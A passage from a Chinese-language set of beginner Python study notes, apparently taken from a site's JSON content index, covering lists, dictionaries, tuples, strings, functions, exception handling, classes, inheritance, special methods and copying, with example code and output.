Traceback (most recent call last):\n  File \"c:\\Users\\tianzhongs\\Desktop\\python学习\\1.py\", line 18, in \u003cmodule\u003e\n    print(b)\n  NameError: name 'b' is not defined\n  ```\n## 列表修改元素\n修改单个元素，直接对元素赋值即可\n修改多个元素，使用切片依次进行赋值\n  \n  ```\n  a=[1,2,3,4,5,6,7]\n  a[2]=23\n  print(a)\n  \n  a[3:]=[32,4343,545]\n  print(a)\n  ```\n结果\n  \n  ```\n  [1, 2, 23, 4, 5, 6, 7]\n  [1, 2, 23, 32, 4343, 545]\n  ```\n## 列表排序\n`sort()` 改变了原来的顺序，但是不会改变列表对象,`reverse=True` 参数从大到小排序\n`sorted()` ，自带的函数，不会改变原来的列表，但是可以赋值给别的变量\n  \n  ```\n  a=[23,34,54,24,25,644,21]\n  #sort排序\n  print(\"排序前\",a,id(a))\n  a.sort()\n  print(\"排序后\",a,id(a))\n  a.sort(reverse=True)\n  print(\"从大到小排序\",a)\n  \n  #使用内置函数\n  a=[23,34,54,24,25,644,21]\n  b=sorted(a)\n  print(\"old\",a)\n  print(\"new\",b)\n  ```\n结果\n  \n  ```\n  排序前 [23, 34, 54, 24, 25, 644, 21] 2278103834752\n  排序后 [21, 23, 24, 25, 34, 54, 644] 2278103834752\n  从大到小排序 [644, 54, 34, 25, 24, 23, 21]\n  old [23, 34, 54, 24, 25, 644, 21]\n  new [21, 23, 24, 25, 34, 54, 644]\n  ```\n## 列表生成式\n\n用于生成有规律的列表。\n\n[i*i for i in range(1,10)]\n\n其中`i*i`表示列表的表达式，并不是就是i*i，比如后面循环的每个数2倍，就是i*2。\n\n```\n[i的规则表达式 for i in*(1,10)]\n#列表生成式\n\n#生成1,4,9,16……\nlst=[i*i for i in range(1,9)]\nprint(lst)\n\n#生成2,4,6,8，10……\nlst=[i*2 for i in range(1,9)]\nprint(lst)\n```\n结果\n  \n  ```\n  [1, 4, 9, 16, 25, 36, 49, 64]\n  [2, 4, 6, 8, 10, 12, 14, 16]\n  ```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/python.07-%E5%AD%97%E5%85%B8":{"title":"python.07 字典","content":"\n\n- 字典是**无序**的可变序列\n  \n  python中的字典用花括号 `{}` 括起来的，字典的数据以 `键值对` （key：value）的方式存在。类似于java中的Map集合对象\n  \n  查询：字典底层是**哈希表**，通过哈希运算来进行查找\n  \n  优点：查询速度快\n  \n  缺点：浪费内存\n  \n  什么是字典？\n- 字典和列表都是可变序列，python内置数据结构之一\n- 字典是无序的序列,以键值对的方式进行存储数据\n- key不允许重复，如果重复定义，后面的定义会覆盖掉前面的定义\n  \n  ```\n  dict1={\"name\":\"阿三\",\"good\":\"吃饭\",\"name\":\"王五\"}\n  print(dict1[\"name\"])\n  ```\n  \n  会输出`王五`\n- 字典中的key必须是不可变对象，比如不能是字典或者列表，因为list还可以继续添加元素，导致变化，通常是字符串、数值等等\n  \n  ```\n  dict2={dict1:\"1\",\"姓名\":\"Alice\"}\n  dict3={list1:\"1\",\"姓名\":\"Alice\"}\n  ```\n  \n  会报错\n- 字典可以动态收缩，就是可以添加和删除元素\n- 字典是一种空间换时间的数据结构\n# 定义方法\n\n```\n# 字典的创建方式\n# 1. 使用花括号\ndict1={\"name\":\"阿三\",\"good\":\"吃饭\"}\n# 2.使用dict()函数\ndict2=dict(name=\"李白\",age=12,国家=\"中国\")\n# 3.创建空字典\ndict={}\nprint(dict1)\nprint(dict2)\n```\n# 查找字典元素\n- 通过`[]`来查找，如果找不到会进行报错\n- 通过get函数来查找，如果找不到返回`None`，也可以指定查找不到时返回的默认值\n  \n  ```\n  dict1={\"name\":\"阿三\",\"good\":\"吃饭\"}\n  # 1.使用[]进行查找\n  print(dict1[\"name\"])\n  print(dict1[\"age\"])\n  \n  # 2.使用get函数进行查找，可以指定查到不到时候的默认值\n  print(dict1.get(\"name\"))\n  print(dict1.get(\"age\"))\n  print(dict1.get(\"age\"),\"找不到\")\n  ```\n  \n  ```\n  python学习/1.py\n  阿三\n  KeyError: 'age' #此处会中断执行\n  阿三\n  None\n  None 找不到\n  ```\n## 增删改查\n- `in` `not in`判断是否存在某key\n- `del`删除某个key的元素\n- `clear()`清空所有元素变成空字典\n- 新增和复制采用 score[xxx]=xxx\n  \n  ```\n  dict1={\"name\":\"阿三\",\"good\":\"吃饭\"}\n  print(\"name\" in dict1)\n  print(\"吃饭\" not in dict1)\n  del dict1[\"name\"]\n  print(dict1)\n  dict1.clear()\n  print(dict1)\n  # 新增元素\n  dict1[\"帅比\"]=\"李四\"\n  print(dict1)\n  dict1[\"帅比\"]=\"王五\"\n  print(dict1)\n  ```\n  \n  output\n  \n  ```\n  True\n  True\n  {'good': '吃饭'}\n  {}\n  {'帅比': '李四'}\n  {'帅比': '王五'}\n  ```\n# 获取视图\n- 获取key的字典，使用`keys()`函数\n- 获取value的字典，使用`values()`函数\n- 获取所有的项，使用`items()`函数\n  \n  ```\n  dict1={\"name\":\"阿三\",\"good\":\"吃饭\"}\n  print(dict1.keys())\n  keyss=list(dict1.keys())\n  print(type(dict1.keys()))\n  print(type(keyss))\n  print(dict1.items())\n  ```\n  \n  output\n  \n  ```\n  dict_keys(['name', 'good'])\n  \u003cclass 'dict_keys'\u003e\n  \u003cclass 'list'\u003e\n  dict_items([('name', '阿三'), ('good', '吃饭')])\n  ```\n# 遍历所有函数\n\n使用for in循环\n\n```\ndict1={\"name\":\"阿三\",\"good\":\"吃饭\"}\nfor item in dict1:\n  print(item,dict1[item])\n```\n# 字典生成式\n\n用于生成一个有规律，或者使用已有的列表来进行生成一个字典\n\n如果两个列表长度不一直，会采用短的那个作为标准\n\n```\n{var1:var2 for var1,var2 in zip(list1,list2)}\n```\n\n例子\n\n```\nlst1=[\"xigud\",\"pingguo\",\"xihongshi\"]\nlst2=[223,34,53]\n# 字典生成式\nd={lt1.upper():lt2 for lt1,lt2 in zip(lst1,lst2)}\nprint(d)\n```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/python.07a-%E5%85%83%E7%BB%84":{"title":"python.07a 元组","content":"\n\n- #python\n# 可变序列和不可变序列\n\n不可变序列不可以进行 **增删改** 操作，而且hash（地址id值不会改变）不会进行改变\n\n而可变序列，会随着增删改操作，改变hash值\n# 元组的定义\n\n采用小括号去定义`()`\n\n不可以将进行增删改操作\n\n\n\n创建元组的方式\n\n1. tuple函数，注意，是两个小括号  touple：元组\n2. 使用小括号\n3. 创建一个元素的元组的时候，后面需要添加一个逗号\n\n```python\n# 第一种创建方式 tuple函数\ntp1=tuple((\"one\",\"two\",\"three\"))\nprint(type(tp1))\n#第二种创建方式\ntp2=(\"张三\",\"李四\",\"王五\")\nprint(type(tp2))\n# 创建空元组\ntp3=tuple()\ntp4=()\n\n# 创建只有一个元素的元组\ntp5=(\"帅\",)\ntp6=tuple((\"帅\",))\n```\n# 元组中元素的可变\n\n元组中的元素是不可变对象，其指向的元素是不可变的\n\n但是元组中的元素中的对象是可以改变的\n\n元组中存储的是对象的内存地址，这些指向对象的地址不能改变，但是指向对象如果是可变的，那么可以改变指向对象的值\n\n```python\n\ntp1=(1,[2,34],5)\nprint(tp1)\nprint(id(tp1[1]))\n# 修改元组中的元素\n# tp1[1]=3 #报错 tuple' object does not support item assignment\n\n#修改元组中元素的对象\ntp1[1].append(23)\nprint(id(tp1[1]))\nprint(tp1)\n```\n\noutput\n\n```python\n(1, [2, 34], 5)\n1710357483968\n1710357483968\n(1, [2, 34, 23], 5)\n```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/python.08-%E5%AD%97%E7%AC%A6%E4%B8%B2":{"title":"python.08 字符串","content":"\n\n- #python\n# 字符串的驻留机制\n\n\u003e \n\n驻留机制，需要在命令行中运行，如果在idea中运行，会让字符串强制驻留，导致结果不一致。\n\n字符串是一个不可变的字符序列，是基本数据类型\n\n字符串生成后，不同的值保存在字符串的保留池当中，不管后面生成多少个一样的字符串，都不会再开辟新的空间，而是把该字符串的值赋值给新的变量。\n\n```\na=\"a\"\nb='a'\nc='''a'''\nprint(id(a),id(b),id(c))\n```\n\noutput\n\n```\n2576735229744 2576735229744 2576735229744\n```\n\n字符串驻留机制的四种情况\n- 字符串长度为0或者1的时候\n  \n  ```\n  \u003e\u003e\u003e a=\"\"\n  \u003e\u003e\u003e b=''\n  \u003e\u003e\u003e a is b\n  True\n  \u003e\u003e\u003e a=\"a\"\n  \u003e\u003e\u003e b='a'\n  \u003e\u003e\u003e a is b\n  True\n  ```\n- 字符串的定义不符合标识符注册的时候，比如后面带有百分号\n  \n  ```\n  \u003e\u003e\u003e b='abc%'\n  \u003e\u003e\u003e a=\"abc%\"\n  \u003e\u003e\u003e a is b\n  False\n  \u003e\u003e\u003e id(a)\n  2242945544624\n  \u003e\u003e\u003e id(b)\n  2242945544560\n  ```\n- 字符串只在编译的时候驻留，而非运行时\n  \n  ```\n  \u003e\u003e\u003e a='abc'\n  \u003e\u003e\u003e b=a+'bc'\n  \u003e\u003e\u003e a is b\n  False\n  \u003e\u003e\u003e c='a'+'bc'\n  \u003e\u003e\u003e a is c\n  True\n  ```\n  \n  b是a和'abc'在程序运行时才赋值的，所以不驻留。\n  \n  而c是编译的时候就赋值了，驻留。（看赋值其中有没有变量就知道了）\n- [-5,256]之间的整数\n  \n  ```\n  \u003e\u003e\u003e a=4\n  \u003e\u003e\u003e b=4\n  \u003e\u003e\u003e a is b\n  True\n  \u003e\u003e\u003e a =-6\n  \u003e\u003e\u003e b=-6\n  \u003e\u003e\u003e a is b\n  ```\n  \n  强制对字符进行驻留使用 `sys`库的`intern`方法\n  \n  ```\n  \u003e\u003e\u003e import sys\n  \u003e\u003e\u003e a='abc%'\n  \u003e\u003e\u003e b='abc%'\n  \u003e\u003e\u003e a is b\n  False\n  \u003e\u003e\u003e a=sys.intern(b)\n  \u003e\u003e\u003e a is b\n  True\n  ```\n## 驻留的优缺点\n- 当需要相同字符串的时候，可以直接从字符串池中拿出来，避免重复创建和销毁，提升效率和节约内存\n- 在需要字符串拼接的时候，使用`join`函数，而非+，因为join函数会先计算字符串长度，再拷贝，只需要new一次对象，比+效率高\n  \n  用+的时候，会频繁申请开辟新的内存地址，然后复制上一次+的结果\n  \n  使用join会直接计算需要多少内存地址，然后拷贝字符串过去\n# 字符串常用操作\n## 查找\n- index() 正向查找字符串的位置，如果找不到，会报错\n- rindex() 逆向查找，同上\n- find()正向查找字符串的位置，**如果找不到，会返回-1**\n- 逆向查找\n  \n  注意：正向下标从0开始，逆向从-1开始\n  \n  ```\n  a='hello,world'\n  print(a.index('o'))\n  print(a.rindex('o'))\n  # print(a.rindex('fd')) #报错 substring not found\n  \n  print(a.find('o'))\n  print(a.rfind('o'))\n  print(a.rfind('fd'))\n  ```\n  \n  output\n  \n  ```\n  4\n  7\n  4\n  7\n  -1\n  ```\n## 大小写转换\n- upper()：大写\n- lower()：小写\n- swapcase():大写转小写，小写转大写\n- capitalize()：首字母大写，其余字母小写\n- title():每个单词首字母大写，单词其余字母小写\n  \n  ```\n  \u003e\u003e\u003e a=\"abCD\"\n  \u003e\u003e\u003e a.upper()\n  'ABCD'\n  \u003e\u003e\u003e a.lower()\n  'abcd'\n  \u003e\u003e\u003e a=\"df fd dDFD\"\n  \u003e\u003e\u003e a.swapcase()\n  'DF FD Ddfd'\n  \u003e\u003e\u003e a.capitalize()\n  'Df fd ddfd'\n  \u003e\u003e\u003e a=\"hello world\"\n  \u003e\u003e\u003e a.title()\n  'Hello World'\n  ```\n## 字符串对其\n-\n- center 居中对其 （字符串个数，填充字符）\n- ljust左对齐 （字符串个数，填充字符）\n- rjust右对齐（字符串个数，填充字符）\n- zfill右对齐（字符串个数），用0填充 （fill：右对齐；长度内左边补零）\n- 如果字符串个数，小于接收的字符串，都会返回原字符\n- ```\n  a=\"hello\"\n  print(a.center(20,\"*\"))\n  print(a.ljust(12,\"*\"))\n  print(a.rjust(12,\"*\"))\n  print(a.zfill(12))\n  ```\n- output\n- ```\n  *******hello********\n  hello*******\n  *******hello\n  0000000hello\n  ```\n- ## 字符串分割\n-\n- spilt 正向分割\n- rspilt 反向分割 第一个参数是分割的字符串，`maxspilt`是分割的最大次数，分割maxspilt次后，剩余的字符串作为整体\n- ```\n  a=\"hello|this|world\"\n  b=a.split(\"|\")\n  c=a.split(\"|\",maxsplit=1)\n  print(b)\n  print(c)\n  print(\"===========\")\n  a=\"hello|this|world\"\n  b=a.rsplit(\"|\")\n  c=a.rsplit(\"|\",maxsplit=1)\n  print(b)\n  print(c)\n  ```\n- output\n- ```\n  ['hello', 'this', 'world']\n  ['hello', 'this|world']\n  ===========\n  ['hello', 'this', 'world']\n  ['hello|this', 'world']\n  ```\n- ## 判断字符串\n-\n- `isdentifier`判断是否是合法标识符，**字母数字下划线**\n- `isspace`判断是否是空白符（制表符换行也算）组成\n- `isalpha`判断是否是字母组成\n- `isdecimal`判断是否是十进制数字组成\n- `isnumberic`判断是否是数字组成，中文，罗马等也算\n- `isalnum`判断是否是和数字组成\n- ```\n  print(1,'fdk'.isidentifier())\n  print(2,\"fdk\".isspace())\n  print(3,\" \\n\".isspace())\n  print(4,\"fdsKJK\".isalpha())\n  print(5,\"343\".isdecimal())\n  print(6,\"3540四\".isnumeric())\n  print(7,\"fsf34\".isalnum())\n  ```\n- output\n- ```\n  1 True\n  2 False\n  3 True\n  4 True\n  5 True\n  6 True\n  7 True\n  ```\n- ## 字符串其他方法\n-\n- `replace`替换\n- `join`使用某个字符串依次拼接元组或者列表中的每一个字符串元素，注意列表或者元组中的每一个元素都必须是字符串，否则会报错\n  \n  ```\n  a=\"hello,world,this,pog\"\n  print(a.replace(\",\",\" \"))\n  b=[\"12\",\"213\",\"fds\"]\n  print(\"-\".join(b))\n  print(\"*\".join(\"你是什么\"))\n  ```\n- outpout\n- ```\n  hello world this pog\n  12-213-fds\n  你*是*什*么\n  ```\n- ## 字符串的比较\n- 从左到右依次比较原始值，也就是ord() （ascll码值或者unicode值）\n- ```\n  print(\"abc\"\u003e\"ab\")\n  print('章'\u003e'里')\n  print(ord('章'),ord('里'))\n  ```\n-\n- #python/问题 `==`和is的区别\n-\n- 两个等于比较的是内容\n- is比较的内存地址，就是`id()`值\n-\n- ## 字符串的切片\n- `[::]` 分别是起始位置，结束位置，步长\n- ```\n  a='1234567890abcdefg'\n  print(a[1:-1:2])\n  print(a[::-1])\n  ```\n- output\n- ```\n  24680bdf\n  gfedcba0987654321\n  ```\n- ## 字符串的三种格式化方法\n-\n- 使用百分号`%`占位符\n- 使用花括号`{}`占位符\n- 使用f-String，在引号\"前面加上f，在占位符花括号里面放变量名\n  \n  ```\n  name='Alice'\n  age=13\n  print(\"1.my name is%s,i am %d\" % (name,age))\n  print(\"2.my name is{0},i am {1}\".format(name,age))\n  print(f\"3.my name is{name},i am {age}\".format(name,age))\n  ```\n- output\n- ```\n  1.my name isAlice,i am 13\n  2.my name isAlice,i am 13\n  3.my name isAlice,i am 13\n  ```\n- ## 字符串的编码与解码\n- 字符串在传输的过程中会转换成二进制，传输之后，然后再转换成原来的编码\n- ```\n  str=\"你是谁\"\n  #编码\n  print(str.encode(\"utf-8\"))\n  print(str.encode(\"GB2312\"))\n  print(str.encode(\"GBK\"))\n  \n  print(\"#解码========\")\n  utf=str.encode(\"utf-8\")\n  print(utf.decode(\"utf-8\"))\n  ```\n- output\n- ```\n  b'\\xe4\\xbd\\xa0\\xe6\\x98\\xaf\\xe8\\xb0\\x81'\n  b'\\xc4\\xe3\\xca\\xc7\\xcb\\xad'\n  b'\\xc4\\xe3\\xca\\xc7\\xcb\\xad'\n  #解码========\n  你是谁\n  ```","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/python.09-%E5%87%BD%E6%95%B0":{"title":"python.09 函数","content":"\n\n- ## 函数的创建和调用\n- ```python\n  def 函数名(输入参数列表):\n    函数体\n    return xxx\n  ```\n- 示例\n- ```python\n  \n  def plus(a,b):\n      return a+b\n  print(plus(23,343))  #output 366\n  ```\n- ## 参数传递\n- 两种传递方式\n- 1. 直接把实参依次传递进去 fun(a,b)\n  2. 使用关键字指定传的值fun(b=12,a=23)\n-\n- 参数传递的内存分析\n- 如果形参是不可变对象，那么函数不会对实参产生影响\n- 如果实参是可变对象，那么函数会影响具体的实参对象\n- ```python\n  def fun(arg1,arg2):\n      print('arg1',arg1)\n      print('arg2',arg2)\n      arg1=100\n      arg2.append(10)\n      print('arg1',arg1)\n      print('arg2',arg2)\n  n1=11\n  n2=[22,33,44]\n  fun(n1,n2)\n  \n  print('n1',n1)\n  print('n2',n2)\n  ```\n- 如下结果可见：n2列表是可变实参，带入函数后，实参也发生了变化\n- ```\n  arg1 11\n  arg2 [22, 33, 44]\n  arg1 100\n  arg2 [22, 33, 44, 10]\n  n1 11\n  n2 [22, 33, 44, 10]\n  ```\n- ## 函数的返回值\n- 1. 如果不需要返回值，不需要return\n  2. 如果只有一个返回值，那么直接返回即可\n  3. 如果返回的是多个返回值，那么返回的是一个元组\n- ```python\n  def fun(nums):\n      odd=[]\n      even=[] #偶数\n      for i in nums:\n          if i%2:\n              odd.append(i)\n          else:\n              even.append(i)\n      return odd,even\n  \n  lst=[1,2,3,4,5,6]\n  print(fun(lst))\n  #outpu\n  ([1, 3, 5], [2, 4, 6])\n  #返回的是一个元组\n  ```\n- ## 形参默认值\n- 在定义函数的时候，可以指定形参的默认值\n- ```python\n  def fun(a,b=23):\n  #这个b就指定了默认值23\n  ```\n- ## 参数定义-个数可变\n- 主要用在**形参参数可变**的情况，当形参的个数位置的时候，一般使用可变位置参数，当参数是关键字形式的时候，就使用关键字可变参数\n- 1. 个数可变的位置参数：使用`*name`一个星号定义，结果是**一个元组**\n  2. 个数可变的关键字参数 `**name`：使用两个星号定义，结果是**一个字典**\n- 注意：参数列表只能有一个可变位置参数，也只能有一个可变关键字参数。当两个可变参数都有一个的时候，可变位置参数在前\n- 例子：print函数\n- ```python\n  def fun(*str):\n      print(str)\n  \n  fun(\"fd\",\"fdfd\")\n  \n  def fun2(**str):\n      print(str)\n  fun2(a=\"d\",b=\"t\")\n  \n  #两个同时存在\n  def fun(*str,**str2):\n      print(str)\n      print(str2)\n  fun(\"fd\",\"fdfd\",c=\"fd\")\n  ```\n- output\n- ```\n  ('fd', 'fdfd')\n  {'a': 'd', 'b': 't'}\n  ('fd', 'fdfd')\n  {'c': 'fd'}\n  ```\n-\n- 混合的情况\n- 在这个函数中，星号之后的c，d只能采用关键字实参传入\n- ```python\n  def fun(a,b,*,c,d,**arg):\n  ```","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/python.10-bug":{"title":"python.10 bug","content":"\n\n- #python\n## try except异常捕获\n当出现异常的时候，可以通过捕获异常，来出现异常的代码进行处理\n```python\ntry:\n    a=int(input('请输入一个整数'))\n    b=int(input('请输入一个整数')) \n    result=a/b\n    print(result)\nexcept ZeroDivisionError:\n    print(\"除数不为0\")\nexcept ValueError:\n    print(\"请输入整数\")\nexcept:\n    print(\"其他异常\")\n```\n## try-except-else-finally\n当没有出现异常的时候，就会执行`else`的代码块\n不管是否出现异常，都会执行`finally`中的代码块\n```python\ntry:\n    a=int(input('请输入一个整数'))\n    b=int(input('请输入一个整数')) \n    result=a/b\n    print(result)\nexcept ZeroDivisionError:\n    print(\"除数不为0\")\nexcept ValueError:\n    print(\"请输入整数\")\nexcept BaseException as e:\n    print(\"其他错误\",e)\nelse:\n    print(\"没有抛出异常\")\nfinally:\n    print(\"程序结束\")\n```\n## 常见的异常\n|异常类型|描述|\n|--|--|\n|ZeroDivionError|除0模0异常|\n|IndexError|下标越界|\n|KeyError|键异常，字典中没有这个键|\n|NameError|未声明异常，没有声明变量|\n|SyntaxError|语法错误|\n|ValueError|传入无效参数异常|\n## traceback模块：打印异常信息\n用于打印异常信息，也可以在出现异常的时候去执行一些任务\n`traceback`是异步线程，与主线程不在一条线上，所以可以去保存日志等等其他工作\n```python\nimport traceback\ntry:\n    a=int(input('请输入一个整数'))\n    b=int(input('请输入一个整数')) \n    result=a/b\n    print(result)\nexcept:\n    print(\"出现异常\")\n    traceback.print_exc()\n```\noutput\n```\n请输入一个整数4\n请输入一个整数d\n出现异常\nTraceback (most recent call last):\n  File \"C:\\Users\\tianzhongs\\Desktop\\python学习\\1.py\", line 4, in \u003cmodule\u003e    \n    b=int(input('请输入一个整数'))\nValueError: invalid literal for int() with base 10: 'd'\n```","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/python.11-%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1":{"title":"python.11 类与对象","content":"#python\n\n## 创建类\n\n类里面一般包含了： id:: 640b206f-957f-4e28-bd9c-e0db61102b98\n\n1. 类属性\n2. 类初始化方法 `def __init__(self,xx):` （相当于java中的构造方法）\n3. 实例方法，相当于在类里面定义函数，参数是`self`\n4. 静态方法，使用`@staticmethod`进行修饰\n5. 类方法，使用`@classmethod`进行修饰 函数：在类之外定义的就叫函数，在类之内定义的就叫**方法** id:: 640b0dfd-5a2d-45ac-81ab-62a3674478f2\n\n```\n  class Student:\n      native_pace=\"吉林\" #类属性，类变量\n      #类初始化方法\n      def __init__(self,name,age):\n          self.name=name\n          self.age=age\n\n      # 实例方法\n      def eat(self):\n          print(self.name,'在吃饭')\n\n      #静态方法\n      @staticmethod\n      def ssay():\n          print('我使用staticmethod进行注解，所以我是静态方法')\n\n      @classmethod\n      def cm(cls):\n          print(\"我用classmethod注解，我是类方法\")\n  #函数\n  def fun():\n      print(\"我在类之外，所以我是函数，不是方法\")\n\n```\n\n## 创建对象和方法的调用\n\n```\n  # 创建实例对象\n  stu1=Student(\"张三\",12)\n  # 调用实例方法\n  stu1.eat()\n  Student.eat(stu1)\n  #调用静态方法\n  stu1.ssay()\n  Student.ssay()\n  #调用其中的属性\n  print(stu1.name,stu1.age)\n\n```\n\n## 动态绑定属性和方法\n\n在实例化对象之后，可以对单个对象进行新的属性和方法赋值，就是动态绑定。 动态绑定的属性和方法，只对绑定的实例对象有用，没有绑定的实例对象是无法使用的。（有绑定的实例对象独有）\n\n```\n  stu3=Student(\"王五\",13)\n  stu4=Student(\"彩旗\",34)\n  #动态绑定属性\n  stu3.address=\"南京\"\n  print(stu3.address)\n  # print(stu4.address) #异常AttributeError: 'Student' object has no attribute 'address，因为没有动态绑定该属性\n\n  #动态绑定方法\n  #1. 先定义函数\n  def show():\n      print(\"大帅比\")\n  #2.将函数绑定给实例对象，作为方法\n  stu4.show=show\n  stu4.show()\n\n```\n\noutput\n\n```\n  南京\n  大帅比\n\n```","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/python.12-%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%85%B7%E4%BD%93%E4%BD%BF%E7%94%A8":{"title":"python.12 对象的具体使用","content":"\n## 面向对象三大特征\n1. 封装\n2. 继承\n3. 多态\n## 封装\n是为了数据安全，避免外部随意访问\n封装方法：在创建构造函数（`__init__`)的时候，使用`self.__属性名`对其进行封装\n封装之后，可以创建实例方法来对其属性进行操作，也可以使用`_类名__属性名`来对其进行强行访问\n```python\nclass Student:\n    def __init__(self,name,age):\n        self.name=name\n        self.__age=age #不希望被外部访问，就封装该属性\n    # 使用实例访问去获取属性\n    def getage(self):\n        return self.__age\ns1=Student(\"张三\",23)\nprint(s1.name)\n# print(s1.__age) #无法直接访问\nprint(s1.getage()) #通过实例访问去访问\n\n#如果没有实例访问，硬要去访问\nprint(dir(s1)) #获取s1实例对象的所有属性\nprint(s1._Student__age) #使用_类名__属性，还是能够访问\n\n```\noutput\n```\n张三\n23\n['_Student__age', '__class__', '__delattr__', \n'__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'getage', 'name']\n23\n```\n## 继承\npython中支持多继承\n### 定义方法\n创建父类之后，使用`class 子类(父类)`的方法定义子类\n如果子类需要使用父类的构造方法，可以使用`super().__init__(属性名称列表)`  （列表中不包括self参数）来进行调用\n```python\nclass Person:\n    def __init__(self,name,age):\n        self.name=name\n        self.age=age\n\n# 创建子类\nclass Student(Person):\n    def __init__(self,name,age,stuNo=12):\n        super().__init__(name,age) #使用父类的构造方法\n    # 实例方法\n    def info(self):\n        print(f\"{self.name}是学生\")\n# 实例化子类对象\ns1=Student(\"张三\",32)\ns1.info()\nprint(type(s1))\n```\n## 方法重写\n如果父类的方法对子类不适用，或者子类不希望使用和父类方法同样的效果，可以对父类的方法进行重写。\n如果在子类方法重写的过程中，希望使用一部分父类的方法，可以使用`super().父类方法()`\neg\n```pyton\nclass Person:\n    def __init__(self,name,age):\n        self.name=name\n        self.age=age\n    def info(self):\n        print(f\"姓名：{self.name} 年龄：{self.age}\")\n# 创建子类\nclass Student(Person):\n    def __init__(self,name,age,stuNo=12):\n        super().__init__(name,age) #使用父类的构造方法\n    # 实例方法 重写\n    def info(self):\n        super().info()\n        print(f\"{self.name}是学生\")\n\np1=Person(\"张三\",34)\np1.info()\nprint(\"==========\")\ns1=Student(\"李四\",123)\ns1.info()\n```\noutput\n```\n姓名：张三 年龄：34\n==========\n姓名：李四 年龄：123\n李四是学生\n```\n## Object类\n所有类默认继承Object类\n内置函数`dir()`可以查看指定对象的所有属性（当对象属性封装之后，也可以查看器封装时候的对应属性，来强制进行访问）\nObject有一个`__str__`方法，用于返回描述对象的信息，`print`函数中就有它的影子，`__str__`类似于java中的`toString`方法，所以，一般对象都会重写`__str__`方法\n```python\n#默认继承Object类\nclass Person:\n    def __init__(self,name,age):\n        self.name=name\n        self.age=age\n    def __str__(self):\n        return (f\"我的名字是{self.name}\")\n    \np1=Person(\"张三\",12)\nprint(p1)\n```\noutput\n```\n我的名字是张三\n```\n## 多态\n多态，就是即使不知道一个变量是什么类型的，仍然可以调用这个方法，在运行的过程中，根据这个变量引用的类型，动态决定调用那个对象的方法\n静态语言实现多态的三个条件\n\t1. 继承\n 2. 方法重写\n 3. 父类引用指向子类对象\n```python\nclass Animal:\n    def eat(self):\n        print(\"动物吃食物\")\n\nclass Dog(Animal):\n    def eat(self):\n        print(\"狗吃骨头\")\nclass Cat(Animal):\n    def eat(self):\n        print(\"猫吃鱼\")\n\nAnimal().eat()\nDog().eat()\nCat().eat()\n\n```\noutput\n```\n动物吃食物\n狗吃骨头\n猫吃鱼\n```\n## 特殊方法和特殊属性\n特殊属性：`_dict _` 获得类对象或实例对象所绑定的所有属性和方法的字典\n特殊方法:\n\t1. `_len_` \n 2. `__add__`（重写对象实例的+号） \n 3. `_new_`  创建对象的方法，有点类似于java中的类静态方法方法，当创建对象的时候，就会自动调用这段代码块\n 4. `_init_`  实例化对象的方法\n```python\nclass Animal:\n    def eat(self):\n        print(\"动物吃食物\")\n    def __add__(self,other):\n        return self.name+other.name\n\nclass Dog(Animal):\n    def eat(self):\n        print(\"狗吃骨头\")\nclass Cat(Animal):\n    def __init__(self):\n        self.name=\"default\"\n    def eat(self):\n        print(\"猫吃鱼\")\n    def _len_(self):\n        return 1\n\nc1=Cat()\nprint(Animal.__dict__)\nprint(c1.__dict__)\n\n#_len_\nprint(Cat._len_(c1))\n\n#_add_\nc2=Cat()\nc3=Cat()\nc2.name='猫1'\nc3.name='猫2'\nprint(c2+c3)\n```\n### `__new__` 和 `__init__`\n`__new__`类似于java中的实例初始化块，当创建对象的时候，会先执行`__new__`中的代码\n只有`__new__`返回了object对象的时候，`__init__`才会开始实例化对象\n```python\nclass Person(object):\n    def __new__(cls,*args,**kwargs):\n        print(f'__new__被调用，cls的id为{id(cls)}')\n        obj=super().__new__(cls)\n        print(f'__new__创建的对象object的id为{id(obj)}')\n        return obj\n    def __init__(self,name,age):\n        print(f'__init__被调用，id为{id(self)}')\n        self.name=name\n        self.age=age\n\nprint(f'object这个类对象的id为{id(object)}')\nprint(f'Person这个类对象的id为{id(Person)}')\n#实例对象\np1=Person(\"张三\",34)\np2=Person(\"张三\",34)\n\nprint(f'p1的id为{id(p1)}')\n```\noutput\n```\nobject这个类对象的id为140720106493824\nPerson这个类对象的id为2567655866448\n__new__被调用，cls的id为2567655866448\n__new__创建的对象object的id为2567657930416     \n__init__被调用，id为2567657930416\n__new__被调用，cls的id为2567655866448\n__new__创建的对象object的id为2567657930320     \n__init__被调用，id为2567657930320\np1的id为2567657930416\n```\n## 浅拷贝与深拷贝\n### 浅拷贝\nPython拷贝一般都是浅拷贝，拷贝时，对象包含的子对象内容不拷贝，因此，源对象与拷贝对象会引用同一个子对象。（拷贝的对象中子对象的引用）\n### 深拷贝\ndeepcopy方法，在拷贝对象时候，对象包含的子对象也会被拷贝。\n- 两个的差别都是所拷贝的对象中存在的子对象是否拷贝，浅拷贝的子对象是公用同一个的，而深拷贝的子对象也会被拷贝一份。\n- ```python\n  class Computer:\n      def __init__(self,cpu,disk):\n          self.cpu=cpu\n          self.disk=disk\n  class Disk:\n      pass\n  class CPU:\n      pass\n  #创建一个compouter\n  disk1=Disk()\n  cpu1=CPU()\n  computer1=Computer(disk1,cpu1)\n  print(\"disk1\",disk1)\n  print(\"cpu1\",cpu1)\n  print(\"compouter1\",computer1)\n  #浅拷贝\n  import copy\n  computer2=copy.copy(computer1)\n  print(\"computer2\",computer2)\n  print(computer2.cpu)\n  print(computer2.disk)\n  print(computer1.disk is computer2.disk) #子对象没有拷贝，所以还是同一个子对象\n  #深拷贝\n  computer3=copy.deepcopy(computer1)\n  print(computer3 is computer1,id(computer3),id(computer1))\n  print(computer1.cpu is computer3) #子对象也被拷贝，所以内存地址和id也不同\n  ```\n  